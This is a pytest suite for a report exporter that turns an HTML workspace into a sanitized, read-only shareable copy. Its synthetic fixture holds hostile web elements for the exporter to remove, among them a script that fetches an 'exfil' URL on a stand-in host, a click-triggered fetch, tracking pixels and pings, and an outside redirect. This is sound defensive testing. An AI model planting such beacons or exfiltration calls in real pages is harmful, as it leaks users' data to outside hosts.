"""Synthetic offline export checks. No database or provider access."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from collections.abc import Generator
from contextlib import contextmanager
from pathlib import Path
from typing import BinaryIO
from unittest import mock

import pytest
from bs4 import BeautifulSoup, Tag

from report.renderers.workspace_script import JS
from report.shareable import MAX_INPUT_BYTES, ShareableReportError, export_shareable_report

CAPABILITY = "SYNTHETIC-PRIVATE-CAPABILITY"
COMMENT = "SYNTHETIC-PRIVATE-COMMENT"


def named(soup: BeautifulSoup, tag: str, label: str) -> Tag:
    node = soup.find(tag, string=label)
    assert isinstance(node, Tag)
    return node


def workspace() -> str:
    boot = json.dumps({"report_capability": CAPABILITY, "server_url": "http://localhost:7421"})
    comments = json.dumps({"comments": [{"body": COMMENT}]})
    return f"""<!doctype html><html><head><title>Synthetic report</title>
<meta http-equiv="refresh" content="0;url=https://example.invalid/leave">
<link rel="stylesheet" href="https://example.invalid/font.css">
<style>.tab-group-pane:not(.active) {{ display:none }} [hidden] {{ display:none }}</style>
</head><body><!-- {COMMENT} -->
<nav class="tabs report-sidebar"><button class="tab active" data-tab="one">One</button>
<button class="tab" data-tab="two">Two</button></nav>
<div class="l1-root"><h1>Synthetic visible analysis</h1>
<script id="workspace-boot" type="application/json">{boot}</script>
<script id="workspace-comments" type="application/json">{comments}</script>
<div class="tab-group-pane active" data-tab-group="one">First section</div>
<div class="tab-group-pane" data-tab-group="two"><p>Second section</p>
<div data-quarter-group="earnings"><button data-quarter="Q1">Q1</button>
<button data-quarter="Q2">Q2</button></div>
<div data-quarter-card data-quarter-group="earnings" data-quarter="Q1">First quarter</div>
<div hidden data-quarter-card data-quarter-group="earnings" data-quarter="Q2">Second quarter</div>
</div><a href="https://example.com/filing" ping="https://example.invalid/track">Citation</a>
<a href="#tab=two">Reading anchor</a><a href="/api/private">Relative app link</a>
<a href="http://127.0.0.1:7421/private">Loopback</a>
<a href="https://host.example.ts.net/private">Tailnet</a><a href="file:///private">File</a>
<a href="http://10.2.3.4/private">Private address</a>
<img src="https://example.invalid/pixel"><img src="data:image/png;base64,AA==">
<button onclick="fetch('https://example.invalid/click')">Save</button>
<input value="private-draft"><form><textarea>private-form-content</textarea></form>
<iframe src="https://example.invalid/frame"></iframe>
</div><aside id="cmt-sidebar">{COMMENT}</aside><aside id="chat-sidebar">private-chat</aside>
<script>{JS}</script><script>fetch('https://example.invalid/exfil')</script>
</body></html>"""


def export(tmp_path: Path, source_text: str | None = None) -> tuple[Path, Path]:
    source = tmp_path / "source.html"
    destination = tmp_path / "share.html"
    source.write_text(workspace() if source_text is None else source_text, encoding="utf-8")
    export_shareable_report(source, destination)
    return source, destination


def test_export_removes_private_payloads_and_app_access_without_changing_source(
    tmp_path: Path,
) -> None:
    source, destination = export(tmp_path)
    assert source.read_text(encoding="utf-8") == workspace()
    result = destination.read_text(encoding="utf-8")
    assert CAPABILITY not in result
    assert COMMENT not in result
    assert "private-chat" not in result
    assert "private-form-content" not in result
    soup = BeautifulSoup(result, "html.parser")
    assert len(soup.select("script")) == 1
    script = soup.select_one("script")
    assert script is not None and script.string == JS
    assert not soup.select("#workspace-boot, #workspace-comments, form, iframe, input, textarea")
    assert named(soup, "button", "Save").has_attr("disabled")
    assert not named(soup, "button", "Two").has_attr("disabled")
    assert named(soup, "a", "Citation")["href"] == "https://example.com/filing"
    assert named(soup, "a", "Citation")["referrerpolicy"] == "no-referrer"
    assert named(soup, "a", "Reading anchor")["href"] == "#tab=two"
    for label in ("Relative app link", "Loopback", "Tailnet", "File", "Private address"):
        assert not named(soup, "a", label).has_attr("href")
    assert "Read-only copy" in soup.get_text()
    assert "review" in soup.get_text()
    policy = soup.select_one('meta[http-equiv="Content-Security-Policy"]')
    assert policy is not None
    csp = policy["content"]
    assert isinstance(csp, str)
    for directive in ("connect-src 'none'", "form-action 'none'", "base-uri 'none'", "sha256-"):
        assert directive in csp
    if os.name != "nt":
        assert destination.stat().st_mode & 0o777 == 0o600


@pytest.mark.parametrize(
    "altered",
    [
        "<html><head></head><body>not a workspace</body></html>",
        workspace().replace(
            "</body>", '<script id="workspace-boot" type="application/json">{}</script></body>'
        ),
        workspace().replace(JS, "unsupported navigation script"),
        workspace().replace('<div class="l1-root">', '<div class="other-root">'),
        workspace().replace("</html>", ""),
        workspace().replace('"comments": [', '"comments": invalid['),
    ],
)
def test_invalid_or_unsupported_input_does_not_create_output(tmp_path: Path, altered: str) -> None:
    with pytest.raises(ShareableReportError):
        export(tmp_path, altered)
    assert not (tmp_path / "share.html").exists()


def test_never_overwrites_any_file(tmp_path: Path) -> None:
    source, destination = export(tmp_path)
    existing = destination.read_bytes()
    for target in (source, destination):
        with pytest.raises((ShareableReportError, FileExistsError)):
            export_shareable_report(source, target)
    assert source.read_text(encoding="utf-8") == workspace()
    assert destination.read_bytes() == existing


@pytest.mark.parametrize("newline", ["\r\n", "\r"])
def test_html_line_endings_preserve_source_bytes(tmp_path: Path, newline: str) -> None:
    source = tmp_path / "source.html"
    destination = tmp_path / "share.html"
    original = workspace().replace("\n", newline).encode("utf-8")
    source.write_bytes(original)
    export_shareable_report(source, destination)
    assert source.read_bytes() == original
    soup = BeautifulSoup(destination.read_bytes().decode("utf-8"), "html.parser")
    script = soup.select_one("script")
    assert script is not None and script.string == JS


def test_rejects_invalid_encoding_and_oversized_input(tmp_path: Path) -> None:
    source = tmp_path / "source.html"
    destination = tmp_path / "share.html"
    for payload in (b"\xff", b" " * (MAX_INPUT_BYTES + 1)):
        source.write_bytes(payload)
        with pytest.raises(ShareableReportError):
            export_shareable_report(source, destination)
        assert not destination.exists()


def test_failed_output_removes_only_its_own_partial_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "source.html"
    destination = tmp_path / "share.html"
    source.write_text(workspace(), encoding="utf-8")
    original = os.fdopen

    @contextmanager
    def fail_write(descriptor: int, mode: str) -> Generator[BinaryIO]:
        with original(descriptor, mode) as stream:
            stream.write(b"synthetic partial output")
            raise OSError("synthetic write failure")
            yield stream

    monkeypatch.setattr(os, "fdopen", fail_write)
    with pytest.raises(OSError, match="synthetic write failure"):
        export_shareable_report(source, destination)
    assert not destination.exists()
    assert source.read_text(encoding="utf-8") == workspace()


def test_full_synthetic_renderer_and_managed_cli_export(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from report.renderers import workspace_html
    from tests import test_workspace_golden as golden

    monkeypatch.setenv("COMMENTS_SERVER_REPORT_CAPABILITY", CAPABILITY)
    # Reuse the golden fixture factories rather than duplicate its full ReportSpec.
    spec = getattr(golden, "_portfolio_spec")(str(tmp_path))
    loader = getattr(golden, "_patched_p3_loader")
    with mock.patch.object(workspace_html, "load_workspace_p3_panels", loader):
        original = workspace_html.render(spec)
    source = tmp_path / "source.html"
    source.write_text(original, encoding="utf-8")
    destination = tmp_path / "share.html"
    root = Path(__file__).resolve().parents[1]
    result = subprocess.run(
        [
            sys.executable,
            "execution/sqlite_bootstrap.py",
            "execution/export_shareable_report.py",
            str(source),
            str(destination),
        ],
        cwd=root,
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    assert "Read-only copy created" in result.stdout
    assert source.read_text(encoding="utf-8") == original
    assert CAPABILITY in original
    assert CAPABILITY not in destination.read_text(encoding="utf-8")
